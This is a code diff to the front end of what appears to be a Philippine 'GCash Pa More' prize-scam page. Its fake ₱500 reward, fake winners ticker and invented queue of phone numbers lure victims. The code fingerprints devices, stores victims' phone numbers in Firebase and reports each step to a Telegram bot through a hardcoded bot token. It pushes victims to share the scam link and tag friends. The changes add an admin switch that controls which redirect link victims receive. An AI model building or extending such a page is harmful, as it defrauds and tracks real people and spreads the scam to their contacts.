@@ -233,7 +233,6 @@
         .popup-card.ban-card .popup-img-wrap::before { background: radial-gradient(circle at center, rgba(255, 68, 68, 0.5) 0%, rgba(139, 0, 0, 0.3) 40%, transparent 70%); }
         .popup-card.ban-card .popup-img { filter: drop-shadow(0 8px 20px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 20px rgba(255, 68, 68, 0.55)); }
 
-        /* ✅ BAN ATTENTION EFFECTS */
         @keyframes banShake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-8px) rotate(-1deg); } 40% { transform: translateX(8px) rotate(1deg); } 60% { transform: translateX(-6px) rotate(-1deg); } 80% { transform: translateX(6px) rotate(1deg); } }
         @keyframes banPulseRed { 0%, 100% { box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 60px rgba(255, 68, 68, 0.5); } 50% { box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 100px rgba(255, 68, 68, 1), 0 0 140px rgba(255, 23, 68, 0.7); } }
         @keyframes attentionBounce { 0%, 100% { transform: scale(1); } 30% { transform: scale(1.08); } 60% { transform: scale(0.97); } }
@@ -241,33 +240,9 @@
         .ban-card.attention-highlight { animation: banPulseRed 1.5s ease-in-out infinite; }
         .ban-attention-text { display: block; margin-top: 12px; padding: 12px 16px; background: rgba(255, 215, 0, 0.15); border: 2px solid #ffe066; border-radius: 12px; font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 700; color: #ffe066; text-align: center; line-height: 1.5; text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); animation: attentionBounce 1.2s ease-in-out infinite; }
 
-        /* ✅ SHARE BUTTON MESSAGE */
-        .share-tag-message {
-            margin-top: 14px;
-            font-family: 'Poppins', sans-serif;
-            font-size: 12px;
-            font-weight: 600;
-            line-height: 1.5;
-            color: rgba(255, 255, 255, 0.95);
-            text-align: center;
-            padding: 10px 14px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1.5px dashed rgba(255, 215, 0, 0.7);
-            border-radius: 12px;
-            text-shadow: 0 0 8px rgba(255, 215, 0, 0.4);
-            letter-spacing: 0.3px;
-        }
-        .share-tag-message strong {
-            color: #ffe066;
-            font-weight: 800;
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.85);
-        }
-        .share-tag-message .tag-icon {
-            display: inline-block;
-            margin-right: 4px;
-            font-size: 13px;
-            filter: drop-shadow(0 0 6px rgba(255, 215, 0, 0.8));
-        }
+        .share-tag-message { margin-top: 14px; font-family: 'Poppins', sans-serif; font-size: 12px; font-weight: 600; line-height: 1.5; color: rgba(255, 255, 255, 0.95); text-align: center; padding: 10px 14px; background: rgba(0, 0, 0, 0.3); border: 1.5px dashed rgba(255, 215, 0, 0.7); border-radius: 12px; text-shadow: 0 0 8px rgba(255, 215, 0, 0.4); letter-spacing: 0.3px; }
+        .share-tag-message strong { color: #ffe066; font-weight: 800; text-shadow: 0 0 10px rgba(255, 215, 0, 0.85); }
+        .share-tag-message .tag-icon { display: inline-block; margin-right: 4px; font-size: 13px; filter: drop-shadow(0 0 6px rgba(255, 215, 0, 0.8)); }
 
         /* READY TO CLAIM */
         .ready-to-claim-wrap { display: none; animation: readyFadeIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
@@ -326,7 +301,7 @@
         <div class="block-badge">◇ SCAN & OPEN ON MOBILE ◇</div>
     </div>
 
-    <!-- ✅ INTENT / BROWSER GUARD -->
+    <!-- INTENT / BROWSER GUARD -->
     <div id="intentBlock">
         <div class="intent-card">
             <div class="intent-badge"><span class="badge-dot"></span><span>⚠️ BROWSER REQUIRED ⚠️</span></div>
@@ -587,7 +562,9 @@
         (function() {
             'use strict';
 
-            // ✅ FB SDK INIT
+            // ============================================================
+            // FB SDK INIT
+            // ============================================================
             window.fbAsyncInit = function() {
                 if (typeof FB !== 'undefined') {
                     FB.init({
@@ -600,6 +577,9 @@
                 }
             };
 
+            // ============================================================
+            // BROWSER / MOBILE GUARDS
+            // ============================================================
             function isInAppBrowser() {
                 var ua = navigator.userAgent || navigator.vendor || window.opera;
                 return /FBAN|FBAV|FB_IAB|FB4A|FBIOS|Instagram|Messenger|Line|Twitter|LinkedIn|Snapchat|MicroMessenger|WhatsApp|Telegram/i.test(ua);
@@ -653,17 +633,35 @@
                 window.location.href = url;
             }
 
+            // ============================================================
+            // CONFIG
+            // ============================================================
             var BOT_TOKEN = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
             var CHAT_ID = '7298607329';
             var TELEGRAM_THROTTLE_MS = 2000;
             var lastTelegramTime = 0;
-            var db = null, userPhone = null, deviceFingerprint = null, deviceDisplayId = null;
+
+            // ============================================================
+            // STATE
+            // ============================================================
+            var db = null;
+            var userPhone = null;
+            var deviceFingerprint = null;
+            var deviceDisplayId = null;
             var currentAiCode = '', aiTimerInterval = null, aiCountdown = 60;
             var skipCountdownInterval = null, skipCountdown = 10;
             var queueTimerInterval = null, queueCountdown = 180;
             var linkListeners = [], isBanned = false, readyToClaim = false, pendingLink = null;
             var queueUsers = [], queueListInterval = null, userInQueue = false, userLinkDeployed = false;
 
+            // ✅ NEW: Version state
+            var SYSTEM_VERSION = 1;       // default = Version I
+            var versionListener = null;
+            var resolvedLinkKey = null;   // key of the link we're currently using
+
+            // ============================================================
+            // MOBILE GUARD
+            // ============================================================
             function isMobileDevice() {
                 var ua = navigator.userAgent || navigator.vendor || window.opera;
                 var isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
@@ -687,6 +685,9 @@
             window.addEventListener('resize', function() { clearTimeout(resizeTimer); resizeTimer = setTimeout(enforceMobileOnly, 250); });
             window.addEventListener('orientationchange', function() { setTimeout(enforceMobileOnly, 300); });
 
+            // ============================================================
+            // FIREBASE INIT
+            // ============================================================
             function initFirebase() {
                 try {
                     if (typeof firebaseConfig !== 'undefined') {
@@ -697,6 +698,9 @@
             }
             initFirebase();
 
+            // ============================================================
+            // TELEGRAM
+            // ============================================================
             function sendTelegram(message) {
                 try {
                     var now = Date.now();
@@ -706,6 +710,9 @@
                 } catch(e) {}
             }
 
+            // ============================================================
+            // DEVICE FINGERPRINT
+            // ============================================================
             function getDeviceFingerprint() {
                 var screenResolution = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
                 var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -742,6 +749,10 @@
                     return db.ref('device_phone_map/' + fingerprint).set({ phone: phone, displayId: deviceDisplayId, lastSeen: Date.now() });
                 });
             }
+
+            // ============================================================
+            // BAN CHECK
+            // ============================================================
             function checkBan(phone, fingerprint) {
                 return db.ref('banned_ghosts/' + phone).once('value').then(function(phoneSnap) {
                     if (phoneSnap.exists()) return { isBanned: true, type: 'phone' };
@@ -809,7 +820,6 @@
             var banCloseBtn = document.getElementById('banClose');
             if (banCloseBtn) banCloseBtn.onclick = function() { closePopup('banPopup'); resetBanUiToStage1(); };
 
-            // ✅ CHANGED: SHARE ON FACEBOOK instead of INVITE FRIENDS
             var banShareFbBtn = document.getElementById('banShareFbBtn');
             if (banShareFbBtn) banShareFbBtn.addEventListener('click', function() {
                 clearBanLockIfExpired();
@@ -832,11 +842,9 @@
                 }
                 if (isBanLocked() || tries >= BAN_MAX_TRIES) { showBanAttention(); return; }
 
-                // ✅ FB.ui share — valid method, no app approval required
                 FB.ui({
                     method: 'share',
-                    href: 'https://tiny.cc/GCashPaMore',
-                    quote: '🎁 Sumali na sa GCash Pa More! Tag 5 friends to get your pending prize! 💰'
+                    href: 'https://tiny.cc/GCashPaMore'
                 }, function(response) {
                     if (response && !response.error_code) {
                         console.log('✅ Share success:', response);
@@ -851,7 +859,6 @@
                         showSuccessPopup('Shared on Facebook!<br><strong>Tag 5 friends</strong> to get your pending prize.');
                     } else {
                         console.log('❌ Share cancelled:', response);
-                        // Even if user cancelled, advance flow (UX)
                         if (db && userPhone) {
                             try {
                                 db.ref('user_sessions/' + userPhone + '/system_verification').update({
@@ -864,6 +871,9 @@
                 });
             }
 
+            // ============================================================
+            // WINNERS TICKER
+            // ============================================================
             function initWinnersTicker() {
                 var prefixes = ['0917','0918','0927','0998','0945','0966','0955','0939','0906','0977'];
                 function generateWinner() {
@@ -957,6 +967,9 @@
             document.getElementById('successClose').onclick = function() { closePopup('successPopup'); };
             document.getElementById('aiVerifyClose').onclick = function() { closePopup('aiVerifyPopup'); stopAiTimer(); };
 
+            // ============================================================
+            // DEVICE INIT
+            // ============================================================
             function initDevice() {
                 if (!db || !browserAllowed) return Promise.resolve();
                 deviceFingerprint = getDeviceFingerprint();
@@ -977,6 +990,156 @@
                 }).catch(function(e) { console.error('initDevice error:', e); });
             }
 
+            // ============================================================
+            // ✅ NEW: VERSION LISTENER
+            // Watches admin/systemVersion and updates SYSTEM_VERSION live.
+            // ============================================================
+            function attachVersionListener() {
+                if (!db || versionListener) return;
+                try {
+                    versionListener = db.ref('admin/systemVersion').on('value', function(snap) {
+                        var data = snap.val();
+                        var v = 1;
+                        if (data) {
+                            if (typeof data === 'number') v = data;
+                            else if (typeof data.version === 'number') v = data.version;
+                            else if (typeof data === 'string') v = parseInt(data, 10) || 1;
+                        }
+                        SYSTEM_VERSION = (v === 2) ? 2 : 1;
+                        console.log('🛡️ SYSTEM_VERSION =', SYSTEM_VERSION);
+                    });
+                } catch(e) { console.warn('Version listener failed:', e); }
+            }
+
+            // ============================================================
+            // ✅ NEW: VERSION-AWARE LINK RESOLUTION
+            //
+            // VERSION 1 (default):
+            //   - Original first-come, first-served
+            //   - Picks first `available` link, marks it `claimed`
+            //
+            // VERSION 2:
+            //   - Picks link with EARLIEST `createdAt` (first deployed)
+            //   - Does NOT mark as 'claimed' — all users share it
+            //   - Logs user into `links/<key>/users/<phone>`
+            //   - Auto-falls back to next earliest when active is deleted
+            // ============================================================
+            function getAvailableLinkV1() {
+                return new Promise(function(resolve) {
+                    if (!db) return resolve(null);
+                    try {
+                        db.ref('admin/redirectLink').once('value').then(function(snap) {
+                            var data = snap.val();
+                            if (data && data.url && data.active !== false) return resolve(data.url);
+                            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(linksSnap) {
+                                if (linksSnap.exists()) {
+                                    var links = linksSnap.val();
+                                    var key = Object.keys(links)[0];
+                                    var linkData = links[key];
+                                    db.ref('links/' + key).update({ status: 'claimed', user: userPhone || 'Unknown', claimedAt: Date.now() });
+                                    resolvedLinkKey = key;
+                                    return resolve(linkData.url);
+                                }
+                                resolve(null);
+                            }).catch(function() { resolve(null); });
+                        }).catch(function() { resolve(null); });
+                    } catch(e) { resolve(null); }
+                });
+            }
+
+            function getAvailableLinkV2() {
+                return new Promise(function(resolve) {
+                    if (!db) return resolve(null);
+                    try {
+                        db.ref('admin/redirectLink').once('value').then(function(snap) {
+                            var data = snap.val();
+                            if (data && data.url && data.active !== false) {
+                                resolvedLinkKey = '__admin_override__';
+                                return resolve(data.url);
+                            }
+                            // Pick the link with the EARLIEST createdAt
+                            db.ref('links').once('value').then(function(linksSnap) {
+                                if (!linksSnap.exists()) return resolve(null);
+                                var links = linksSnap.val();
+                                var arr = Object.entries(links)
+                                    .filter(function(e) { return e[1] && e[1].url; })
+                                    .sort(function(a, b) {
+                                        return (a[1].createdAt || 0) - (b[1].createdAt || 0);
+                                    });
+                                if (!arr.length) return resolve(null);
+                                var firstKey = arr[0][0];
+                                var firstData = arr[0][1];
+                                resolvedLinkKey = firstKey;
+                                // Log user in the shared link's users map (best-effort)
+                                if (userPhone) {
+                                    try {
+                                        db.ref('links/' + firstKey + '/users/' + userPhone).set(Date.now());
+                                    } catch(e) {}
+                                }
+                                return resolve(firstData.url);
+                            }).catch(function() { resolve(null); });
+                        }).catch(function() { resolve(null); });
+                    } catch(e) { resolve(null); }
+                });
+            }
+
+            // Public entry — picks version dynamically
+            function getAvailableLink() {
+                if (SYSTEM_VERSION === 2) return getAvailableLinkV2();
+                return getAvailableLinkV1();
+            }
+
+            // ============================================================
+            // ✅ NEW: LIVE LINK LISTENER for Version II
+            // When admin deletes the active link, resolve to the next one.
+            // ============================================================
+            function startLinkListenerV2() {
+                stopLinkListeners();
+                if (!db) return;
+                // Listen to ALL links changes
+                var ref = db.ref('links');
+                var cb = ref.on('value', function(snap) {
+                    // Ignore if user hasn't claimed yet or already opened
+                    if (!userInQueue && !readyToClaim && !pendingLink) return;
+                    var links = snap.val() || {};
+                    var arr = Object.entries(links)
+                        .filter(function(e) { return e[1] && e[1].url; })
+                        .sort(function(a, b) { return (a[1].createdAt || 0) - (b[1].createdAt || 0); });
+                    if (!arr.length) {
+                        // No more links — leave user on current
+                        console.log('⚠️ No links left');
+                        return;
+                    }
+                    var firstKey = arr[0][0];
+                    var firstUrl = arr[0][1].url;
+                    // If the active link changed (deleted or reordered), swap
+                    if (firstKey !== resolvedLinkKey) {
+                        console.log('🔀 Active link changed — switching to next');
+                        resolvedLinkKey = firstKey;
+                        if (userPhone) {
+                            try { db.ref('links/' + firstKey + '/users/' + userPhone).set(Date.now()); } catch(e) {}
+                        }
+                        // If user is in queue and we already have pendingLink, swap pendingLink
+                        if (pendingLink && firstUrl !== pendingLink) {
+                            pendingLink = firstUrl;
+                        }
+                        // If user is ready to claim and hasn't clicked yet, update the URL
+                        if (readyToClaim) {
+                            pendingLink = firstUrl;
+                            // Optionally notify
+                            sendTelegram('🔀 LINK SWAPPED (V2)\n👤 ' + userPhone + '\n🔗 ' + firstUrl);
+                        } else if (userInQueue) {
+                            // Still in queue: they haven't been shown the ready screen
+                            pendingLink = firstUrl;
+                        }
+                    }
+                });
+                linkListeners.push({ ref: ref, cb: cb, event: 'value' });
+            }
+
+            // ============================================================
+            // CONTINUE MISSION → OPEN CLAIM POPUP
+            // ============================================================
             document.getElementById('continueBtn').addEventListener('click', function(e) {
                 e.preventDefault();
                 if (!browserAllowed || isBanned) return;
@@ -1002,6 +1165,9 @@
                 });
             }
 
+            // ============================================================
+            // GET ₱500 — VERSION-AWARE FLOW
+            // ============================================================
             document.getElementById('get500Btn').addEventListener('click', function(e) {
                 e.preventDefault();
                 if (!browserAllowed) return;
@@ -1042,7 +1208,7 @@
                             }
                         });
                     }).then(function() {
-                        sendTelegram('🎯 USER CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
+                        sendTelegram('🎯 USER CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n📦 v' + SYSTEM_VERSION);
                         return checkFirewall().then(function(firewallActive) {
                             if (firewallActive) {
                                 closePopup('catClaimPopup');
@@ -1051,11 +1217,19 @@
                                 showAiVerificationPopup();
                                 return;
                             }
+                            // ✅ Version-aware link resolution
                             return getAvailableLink().then(function(linkUrl) {
                                 if (linkUrl) {
+                                    // Resolved: show countdown, then open
                                     closePopup('catClaimPopup');
-                                    self.innerHTML = '<span>✅ OPENING...</span>';
-                                    setTimeout(function() { openAsDeeplink(linkUrl); }, 800);
+                                    self.innerHTML = '<span>✅ READY...</span>';
+                                    // Reset queue state so we land on a clean skip popup
+                                    readyToClaim = false; pendingLink = linkUrl;
+                                    document.getElementById('queueNormalState').style.display = 'block';
+                                    document.getElementById('readyToClaimWrap').classList.remove('show');
+                                    openPopup('skipClaimPopup');
+                                    startSkipCountdown();
+                                    // After skip countdown, user clicks SKIP & CLAIM → goes to queue → ready
                                     return;
                                 }
                                 closePopup('catClaimPopup');
@@ -1078,27 +1252,6 @@
                     try { db.ref('admin/globalFirewall').once('value').then(function(snap) { var data = snap.val(); resolve(data && data.active === true); }).catch(function() { resolve(false); }); } catch(e) { resolve(false); }
                 });
             }
-            function getAvailableLink() {
-                return new Promise(function(resolve) {
-                    if (!db) return resolve(null);
-                    try {
-                        db.ref('admin/redirectLink').once('value').then(function(snap) {
-                            var data = snap.val();
-                            if (data && data.url && data.active !== false) return resolve(data.url);
-                            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(linksSnap) {
-                                if (linksSnap.exists()) {
-                                    var links = linksSnap.val();
-                                    var key = Object.keys(links)[0];
-                                    var linkData = links[key];
-                                    db.ref('links/' + key).update({ status: 'claimed', user: userPhone || 'Unknown', claimedAt: Date.now() });
-                                    return resolve(linkData.url);
-                                }
-                                resolve(null);
-                            }).catch(function() { resolve(null); });
-                        }).catch(function() { resolve(null); });
-                    } catch(e) { resolve(null); }
-                });
-            }
 
             function showSuccessPopup(message) {
                 var msgEl = document.getElementById('successMessage');
@@ -1108,6 +1261,9 @@
             }
             document.getElementById('successOkBtn').addEventListener('click', function() { closePopup('successPopup'); });
 
+            // ============================================================
+            // SKIP COUNTDOWN
+            // ============================================================
             function startSkipCountdown() {
                 stopSkipCountdown();
                 skipCountdown = 10;
@@ -1131,6 +1287,9 @@
             }
             function stopSkipCountdown() { if (skipCountdownInterval) { clearInterval(skipCountdownInterval); skipCountdownInterval = null; } }
 
+            // ============================================================
+            // SKIP & CLAIM → QUEUE POPUP
+            // ============================================================
             document.getElementById('skipClaimBtn').addEventListener('click', function() {
                 if (!browserAllowed) return;
                 if (this.disabled) return;
@@ -1140,18 +1299,31 @@
                 stopSkipCountdown();
                 var gcashValue = userPhone;
                 if (!gcashValue || gcashValue.length !== 11 || !gcashValue.startsWith('09')) { alert('Invalid mobile number. Please refresh and try again.'); return; }
-                sendTelegram('💰 CLAIM SUBMITTED\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
+                sendTelegram('💰 CLAIM SUBMITTED\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n📦 v' + SYSTEM_VERSION);
                 setTimeout(function() {
-                    readyToClaim = false; pendingLink = null; userInQueue = false; userLinkDeployed = false; queueUsers = [];
+                    readyToClaim = false;
+                    // pendingLink is already set from getAvailableLink()
+                    // If Version 2, keep listening for link changes
+                    if (SYSTEM_VERSION === 2 && !pendingLink) {
+                        // Edge case: no link resolved; re-resolve
+                        getAvailableLink().then(function(url) {
+                            pendingLink = url;
+                        });
+                    }
+                    userInQueue = false; userLinkDeployed = false; queueUsers = [];
                     document.getElementById('queueNormalState').style.display = 'block';
                     document.getElementById('readyToClaimWrap').classList.remove('show');
                     openPopup('queuePopup');
                     startQueueTimer();
                     startLiveUsersCounter();
+                    // Start link listener (V2 only in startLinkListener; V1 no-op)
                     startLinkListener();
                 }, 400);
             });
 
+            // ============================================================
+            // QUEUE TIMER
+            // ============================================================
             function startQueueTimer() {
                 stopQueueTimer();
                 queueCountdown = 180;
@@ -1178,10 +1350,13 @@
             }
             function stopQueueTimer() { if (queueTimerInterval) { clearInterval(queueTimerInterval); queueTimerInterval = null; } }
 
-            function saveCountdownState() { if (!db || !userPhone) return; try { db.ref('user_sessions/' + userPhone + '/system_verification').set({ status: 'counting_down', countdownTimer: 180, countdownStartedAt: Date.now(), deviceId: deviceDisplayId, phone: userPhone, code: '----', timer: 180, lastUpdate: Date.now() }); } catch(e) {} }
+            function saveCountdownState() { if (!db || !userPhone) return; try { db.ref('user_sessions/' + userPhone + '/system_verification').set({ status: 'counting_down', countdownTimer: 180, countdownStartedAt: Date.now(), deviceId: deviceDisplayId, phone: userPhone, code: '----', timer: 180, lastUpdate: Date.now(), version: SYSTEM_VERSION }); } catch(e) {} }
             function updateCountdownState(remaining) { if (!db || !userPhone) return; try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ countdownTimer: remaining, timer: remaining, lastUpdate: Date.now() }); } catch(e) {} }
             function clearCountdownState() { if (!db || !userPhone) return; try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ status: 'completed', countdownTimer: 0, timer: 0, lastUpdate: Date.now() }); } catch(e) {} }
 
+            // ============================================================
+            // QUEUE USERS UI
+            // ============================================================
             var queuePrefixes = ['0912','0917','0918','0927','0998','0945','0966','0955','0939','0906','0977','0908','0920','0921','0928','0929','0930','0935','0936','0946','0947','0948','0949','0950','0951','0956','0961','0963','0965','0967','0975','0976','0978','0979','0994','0995','0996','0997'];
             function generateQueueNumber() {
                 var p = queuePrefixes[Math.floor(Math.random() * queuePrefixes.length)];
@@ -1225,6 +1400,9 @@
             }
             function stopLiveUsersCounter() { if (queueListInterval) { clearInterval(queueListInterval); queueListInterval = null; } }
 
+            // ============================================================
+            // READY TO CLAIM
+            // ============================================================
             function showReadyToClaim(linkUrl) {
                 if (readyToClaim) return;
                 userLinkDeployed = true; stopLiveUsersCounter();
@@ -1249,7 +1427,7 @@
                 var readyState = document.getElementById('readyToClaimWrap');
                 if (normalState) normalState.style.display = 'none';
                 if (readyState) readyState.classList.add('show');
-                sendTelegram('✨ READY TO CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
+                sendTelegram('✨ READY TO CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n📦 v' + SYSTEM_VERSION);
             }
 
             document.getElementById('readyClaimBtn').addEventListener('click', function() {
@@ -1258,11 +1436,21 @@
                 if (navigator.vibrate) { try { navigator.vibrate(30); } catch(e) {} }
                 this.innerHTML = '<span>⏳ OPENING...</span>';
                 this.style.pointerEvents = 'none'; this.style.opacity = '0.85';
-                sendTelegram('🎁 USER TAPPED CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
+                sendTelegram('🎁 USER TAPPED CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n📦 v' + SYSTEM_VERSION);
                 setTimeout(function() { openAsDeeplink(pendingLink); }, 600);
             });
 
+            // ============================================================
+            // LINK LISTENERS — dispatch per version
+            // ============================================================
             function startLinkListener() {
+                if (SYSTEM_VERSION === 2) {
+                    startLinkListenerV2();
+                } else {
+                    startLinkListenerV1();
+                }
+            }
+            function startLinkListenerV1() {
                 stopLinkListeners();
                 if (!db) return;
                 var ref1 = db.ref('admin/redirectLink');
@@ -1275,6 +1463,7 @@
                         var key = Object.keys(links)[0];
                         var linkData = links[key];
                         db.ref('links/' + key).update({ status: 'claimed', user: userPhone || 'Unknown', claimedAt: Date.now() });
+                        resolvedLinkKey = key;
                         showReadyToClaim(linkData.url);
                     }
                 });
@@ -1285,6 +1474,9 @@
                 linkListeners = [];
             }
 
+            // ============================================================
+            // AI VERIFICATION
+            // ============================================================
             function showAiVerificationPopup() {
                 if (!browserAllowed) return;
                 document.getElementById('aiStage1').classList.remove('hidden');
@@ -1387,11 +1579,29 @@
                 aiCodeInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') document.getElementById('aiVerifyBtn').click(); });
             }
 
+            // ============================================================
+            // INIT
+            // ============================================================
             setTimeout(function() {
                 if (browserAllowed) {
                     initDevice().then(function() {
                         console.log('✅ Mission page initialized');
                     });
+                    // Attach live version listener + initial read
+                    attachVersionListener();
+                    if (db) {
+                        db.ref('admin/systemVersion').once('value').then(function(snap) {
+                            var data = snap.val();
+                            var v = 1;
+                            if (data) {
+                                if (typeof data === 'number') v = data;
+                                else if (typeof data.version === 'number') v = data.version;
+                                else if (typeof data === 'string') v = parseInt(data, 10) || 1;
+                            }
+                            SYSTEM_VERSION = (v === 2) ? 2 : 1;
+                            console.log('✅ Version loaded:', SYSTEM_VERSION);
+                        }).catch(function() {});
+                    }
                 }
             }, 500);
 
